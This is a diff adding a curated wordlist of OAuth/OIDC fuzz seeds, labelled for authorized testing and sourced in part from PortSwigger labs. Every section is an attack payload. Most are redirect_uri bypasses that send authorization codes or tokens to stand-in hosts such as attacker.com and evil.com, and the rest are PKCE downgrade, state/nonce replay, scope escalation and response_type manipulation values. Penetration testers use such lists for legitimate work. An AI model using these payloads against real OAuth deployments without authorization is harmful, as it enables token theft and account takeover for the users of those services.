@@ -1,0 +1,65 @@
+# OAuth / OIDC — redirect_uri and parameter fuzz seeds
+# Source: oauth-oidc-advanced.md, RFC 6749, PortSwigger OAuth labs
+# Tier: Curated | Authorized testing only
+
+# --- Path-relative / traversal ---
+/callback/../../../redirect?url=https://attacker.com
+/open-redirect?url=https://attacker.com
+/callback/..%2f..%2f..%2fredirect?url=https://attacker.com
+
+# --- Subdomain / sibling domain ---
+https://attacker.target.com/callback
+https://target.com.attacker.com/callback
+https://targetcom.attacker.com/callback
+
+# --- Open redirect on allowed domain ---
+https://target.com/logout?next=https://attacker.com
+https://target.com/login?redirect=https://attacker.com
+https://target.com/oauth/callback?continue=https://attacker.com
+
+# --- Fragment / userinfo tricks ---
+https://target.com/callback%23@attacker.com
+https://target.com/callback#@attacker.com
+https://target.com@attacker.com/callback
+
+# --- Parameter pollution ---
+https://target.com/callback&redirect_uri=https://attacker.com
+https://target.com/callback?redirect_uri=https://target.com/callback&redirect_uri=https://attacker.com
+
+# --- Encoding / normalization ---
+https://target.com%2f%2fattacker.com
+https://target.com%5c%5cattacker.com
+https://target.com%09.attacker.com
+https://target.com%00.attacker.com
+https://target.com%252f%252fattacker.com
+
+# --- Wildcard registration probes ---
+https://evil.attacker.com
+http://127.0.0.1/callback
+http://localhost/callback
+https://target.com.evil.com/callback
+
+# --- PKCE downgrade probes (authorization request params) ---
+code_challenge=
+code_challenge_method=plain
+code_challenge_method=s256
+code_challenge_method=PLAIN
+
+# --- State / nonce reuse (capture once, replay) ---
+# state=REPLAY_CAPTURED_STATE
+# nonce=REPLAY_CAPTURED_NONCE
+
+# --- Scope escalation ---
+scope=openid profile email admin
+scope=openid%20profile%20email%20admin
+scope=openid+profile+email+offline_access
+
+# --- Response type manipulation ---
+response_type=code
+response_type=token
+response_type=code id_token token
+response_type=code&response_type=token
+
+# --- Client impersonation / public client_id from JS bundle ---
+# client_id=PUBLIC_CLIENT_FROM_BUNDLE
+# redirect_uri=https://attacker.com/callback
